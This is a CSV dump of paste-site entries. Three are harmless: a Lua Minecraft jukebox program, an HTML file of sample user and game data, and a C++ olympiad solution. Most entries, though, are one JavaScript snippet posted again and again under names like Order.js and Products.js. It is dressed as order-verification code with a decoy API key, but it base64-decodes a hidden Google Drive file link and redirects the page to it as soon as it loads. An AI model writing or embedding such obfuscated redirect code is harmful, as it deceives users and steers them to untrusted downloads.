id,title,username,language,date,content
CXvRAKaV,jukebox,HappySunChild,Lua,Wednesday 9th of April 2025 06:18:39 PM CDT,"local selection = 1
local playing = 0
local records = {
	{ ""blocks"", ""minecraft:music_disc.blocks"" },
	{ ""cat"", ""minecraft:music_disc.cat"" },
	{ ""chirp"", ""minecraft:music_disc.chirp"" },
	{ ""far"", ""minecraft:music_disc.far"" },
	{ ""mall"", ""minecraft:music_disc.mall"" },
	{ ""mellohi"", ""minecraft:music_disc.mellohi"" },
	{ ""stal"", ""minecraft:music_disc.stal"" },
	{ ""strad"", ""minecraft:music_disc.strad"" },
	{ ""ward"", ""minecraft:music_disc.ward"" },
	{ ""wait"", ""minecraft:music_disc.wait"" },
	{ ""pigstep"", ""minecraft:music_disc.pigstep"" },
}

---@type peripheral.Speaker
local speaker = peripheral.wrap(""bottom"")
local width = term.getSize()

local floor = math.floor

---@param y number
---@param text string
local function writeCenter(y, text)
	local length = string.len(text)

	term.setCursorPos(floor(width / 2 - length / 2), y)
	write(text)
end

---@param x number
---@param y number
---@param text string
local function writeRight(x, y, text)
	local length = string.len(text)

	term.setCursorPos(x - length, y)
	write(text)
end

local function displayRecords()
	term.clear()
	term.setTextColor(colors.purple)
	writeCenter(1, ""Jukebox"")

	for i = 1, #records do
		local info = records[i]
		local name = info[1]

		term.setTextColor(colors.lightGray)

		if selection == i then
			term.setTextColor(colors.white)

			name = ""> "" .. name
		end

		name = string.format(""%d. %s"", i, name)

		term.setCursorPos(2, i + 2)
		write(name)
	end

	local playingRecord = records[playing]
	local playingName = playingRecord and playingRecord[1] or ""None""

	term.setTextColor(colors.lightGray)
	writeRight(width, 2, string.format(""Playing: %s"", playingName))
end

displayRecords()

while true do
	local _, key = os.pullEvent(""key"")

	if key == keys.up then
		selection = math.max(selection - 1, 1)
	elseif key == keys.down then
		selection = math.min(selection + 1, #records)
	elseif key == keys.enter then
		local info = records[selection]

		if speaker.playSound(info[2], 2, 1) then
			playing = selection
		end
	end

	displayRecords()
end
"
YuYbjWmw,Untitled,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 06:10:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12915/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
y6zbAxDF,Products.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 05:54:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06968/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ap7DnAnh,Order.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 05:39:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26908/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VJMzUgtB,Market.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 05:24:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97830/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dkGycD3P,Untitled,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 05:08:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48891/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3VHH5nDv,Untitled,lemansky,HTML,Wednesday 9th of April 2025 04:59:43 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
	<meta charset=""UTF-8"">
	<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
	<title>Document</title>
	<script>
		let users = [{""id"":1,""name"":""Thomas"",""email"":""thomas.smith@gmail.com"",""age"": 22,""city"":""New York""},{""id"":2,""name"":""Emma"",""email"":""emma.j@gmail.com"",""age"": 31, ""city"":""Chicago""},{""id"":3,""name"":""Michael"",""email"":""michael.b@gmail.com"",""age"": 46, ""city"":""New York""},{""id"":4,""name"":""Sarah"",""email"":""sarah.d@gmail.com"",""age"": 18,""city"":""Los Angeles""},{""id"":5,""name"":""Robert"",""email"":""robert.w@gmail.com"",""age"": 21,""city"":""Chicago""},{""id"":6,""name"":""Jessica"",""email"":""jessica.m@gmail.com"",""age"": 32,""city"":""Houston""},{""id"":7,""name"":""David"",""email"":""david@gmail.com"",""age"": 19, ""city"":""Phoenix""},{""id"":8,""name"":""Jennifer"",""email"":""jennifer.t@gmail.com"",""age"": 35,""city"":""Los Angeles""},{""id"":9,""name"":""Peter"",""email"":""peter@gmail.com"",""age"": 22, ""city"":""New York""},{""id"":10,""name"":""Lisa"",""email"":""lisa@gmail.com"",""age"": 46, ""city"":""Chicago""}];
		let games = [{""title"":""The Witcher 3: Wild Hunt"",""genre"":""Action RPG"",""characters"":{""protagonist"":{""name"":""Geralt of Rivia"",""role"":""Witcher"",""signatureAbility"":""Igni fire magic""},""antagonist"":{""name"":""Eredin"",""role"":""King of the Wild Hunt"",""signatureAbility"":""Dimensional travel""},""companion"":{""name"":""Ciri"",""role"":""The Lion Cub of Cintra"",""signatureAbility"":""Elder Blood powers""}}},{""title"":""Overwatch 2"",""genre"":""Hero Shooter"",""characters"":{""damage"":{""name"":""Tracer"",""role"":""Time-jumping adventurer"",""signatureAbility"":""Blink teleport""},""tank"":{""name"":""Reinhardt"",""role"":""Crusader knight"",""signatureAbility"":""Rocket Hammer""},""support"":{""name"":""Mercy"",""role"":""Guardian angel"",""signatureAbility"":""Caduceus Staff healing""}}},{""title"":""Street Fighter 6"",""genre"":""Fighting"",""characters"":{""legend"":{""name"":""Ryu"",""role"":""Wandering warrior"",""signatureAbility"":""Hadouken fireball""},""newcomer"":{""name"":""Luke"",""role"":""MMA fighter"",""signatureAbility"":""Sand Blast punch""},""villain"":{""name"":""M. Bison"",""role"":""Dictator"",""signatureAbility"":""Psycho Crusher""}}}];
	</script>
</head>
<body>
	
</body>
</html>"
sm9mjxZQ,Products.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 04:53:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69073/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YAhkL7q6,Order.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 04:37:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95251/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
skT1QBE0,Market.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 04:22:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/35181/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
J7bs9WtN,Untitled,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 04:07:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49643/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FbUiKmqC,Market.js,hubertzoo90,JavaScript,Wednesday 9th of April 2025 03:51:02 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42542/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
shRyH6Nw,Untitled,hubertzoo90,JavaScript,Wednesday 9th of April 2025 03:35:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23471/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kvqtz7m7,Олимпијада (мои '16),PlanttPastes,C++,Wednesday 9th of April 2025 03:29:49 PM CDT,"#include <bits/stdc++.h>
using namespace std;
#pragma GCC optimize(""O2,O3,Ofast,unroll-loops"")

const int N = 107308, inf = 1797710308;
int n, L, H, s;
vector <pair <int, int>> g[N];
int sgt[3 * N], subtsize[N];
bool resetsgt[3 * N], visited[N];

void sgtupdate(int q, int val, int node, int cl, int cr) {
	if (q < cl || cr < q) return;
	if (resetsgt[node]) {
		if (node < s) resetsgt[2 * node + 1] = resetsgt[2 * node + 2] = true;
		sgt[node] = -inf;
		resetsgt[node] = false;
	}
	if (q == cl && q == cr) {
		sgt[node] = max(sgt[node], val);
		return;
	}
	int cm = cl + cr >> 1;
	sgtupdate(q, val, 2 * node + 1, cl, cm);
	sgtupdate(q, val, 2 * node + 2, cm + 1, cr);
	sgt[node] = max(resetsgt[2 * node + 1] ? -inf : sgt[2 * node + 1], resetsgt[2 * node + 2] ? -inf : sgt[2 * node + 2]);
}
int sgtget(int ql, int qr, int node, int cl, int cr) {
	if (qr < cl || cr < ql) return -inf;
	if (resetsgt[node]) return -inf;
	if (ql <= cl && cr <= qr) return sgt[node];
	int cm = cl + cr >> 1;
	return max(sgtget(ql, qr, 2 * node + 1, cl, cm), sgtget(ql, qr, 2 * node + 2, cm + 1, cr));
}
int &calcsubt(const int &node, const int &parent) {
	subtsize[node] = 1;
	for (auto &[neigh, _] : g[node]) {
		if (visited[neigh] || neigh == parent) continue;
		subtsize[node] += calcsubt(neigh, node);
	}
	return subtsize[node];
}
bool querydfs(const int &node, const int &parent, const int &depth, const int &val, const int &median) {
	if (sgtget(L - depth, H - depth, 0, 0, s) + val >= 0) {
		// cerr << ""FOUND IT!\n"";
		return true; // NAJDOVME!! se vrakame do binary searchot
	}
	for (auto &[child, w] : g[node]) {
		if (child == parent || visited[child]) continue;
		if (querydfs(child, node, depth + 1, val + (w >= median ? 1 : -1), median)) return true;
	}
	return false;
}
void updatedfs(const int &node, const int &parent, const int &depth, const int &val, const int &median) {
	sgtupdate(depth, val, 0, 0, s);
	for (auto &[child, w] : g[node]) {
		if (child == parent || visited[child]) continue;
		updatedfs(child, node, depth + 1, val + (w >= median ? 1 : -1), median);
	}
}
pair <int, int> findcentroid(int node) {
	int sz = subtsize[node] / 2, parent = -1;
	bool cont = true;
	while (cont) {
		cont = false;
		for (auto &[neigh, _] : g[node]) {
			if (!visited[neigh] && neigh != parent && subtsize[neigh] > sz) {
				cont = true;
				parent = node;
				node = neigh;
				break;
			}
		}
	}
	return {node, parent};
}
bool searchpath(const int &root, const int &median) {
	if (visited[root]) return false;
	auto [centroid, centparent] = findcentroid(root);
	visited[centroid] = true;
	resetsgt[0] = true;
	sgtupdate(0, 0, 0, 0, s);
	for (auto &[neigh, w] : g[centroid]) {
		if (visited[neigh]) continue;
		if (querydfs(neigh, centroid, 1, w >= median ? 1 : -1, median)) {
			// cerr << ""FOUND!! "" << centroid << ' ' << neigh << ' ' << median << '\n';
			return true;
		}
		updatedfs(neigh, centroid, 1, w >= median ? 1 : -1, median);
	}
	if (centparent >= 0) calcsubt(centparent, -1);
	for (auto &[neigh, _] : g[centroid]) {
		if (searchpath(neigh, median)) return true;
	}
	return false;
}
// Dali postoi pat so medijana >= median
bool ok(int median) {
	memset(visited, 0, n * sizeof(bool));
	calcsubt(0, -1);
	return searchpath(0, median);
}
signed main() {
	ios::sync_with_stdio(0);
	cin.tie(0); cout.tie(0);
	cin >> n >> L >> H;
	s = (1 << int(ceil(log2(n + 5)))) - 1;
	for (int i = 1, a, b, w; i < n; i++) {
		cin >> a >> b >> w;
		g[--a].push_back({--b, w});
		g[b].push_back({a, w});
	}
	int l = 0, r = 15e8, m;
		while (r - l > 1) {
		m = l + r >> 1;
		if (ok(m)) l = m;
		else r = m;
	}
	// cerr << l << ' ' << r;
	cout << (l != r && ok(r) ? r : l);
}"
m8VVBkDh,Products.js,hubertzoo90,JavaScript,Wednesday 9th of April 2025 03:20:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13022/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
13jwcusx,Order.js,hubertzoo90,JavaScript,Wednesday 9th of April 2025 03:04:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42240/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
